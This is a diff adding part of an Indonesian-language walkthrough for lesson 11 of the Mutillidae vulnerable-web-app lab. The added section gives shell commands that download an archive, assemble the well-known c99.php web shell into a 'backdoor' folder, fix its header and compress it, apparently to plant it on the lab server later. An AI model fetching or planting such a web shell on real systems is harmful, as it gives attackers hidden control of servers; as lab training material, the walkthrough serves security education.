@@ -1,6 +1,36 @@
 # Mutillidae Lesson 11
 
 
+### Download c99.php
+- Buka terminal dan ketikkan perintah berikut
+```
+mkdir -p /root/backdoor
+cd /root/backdoor/
+wget http://www.computersecuritystudent.com/SECURITY_TOOLS/MUTILLIDAE/MUTILLIDAE_2511/lesson11/stuff.rar
+ls -lrt
+```
+![](Mutillidae%20lesson%211/1.png)
+- Ekstrak stuff.rar
+```
+unrar x stuff.rar
+cat part1.txt part2.txt part3.txt > c99.php
+cp c99.php c99.php.bkp
+ls -lrt
+```
+![](Mutillidae%20lesson%211/2.png)
+- Pastikan baris pertama dari c99.php '<?php'
+```
+head -1 c99.php
+sed -i '1 s/^.*$/<?php/g' c99.php // lakukan jika baris pertama tidak '<?php'
+head -1 c99.php
+```
+- Kompres c99.php
+```
+gzip c99.php
+```
+![](Mutillidae%20lesson%211/3.png)
+
+
 ### Membuka Halaman User Info
 
 - Pada client, buka mutillidae dari browser
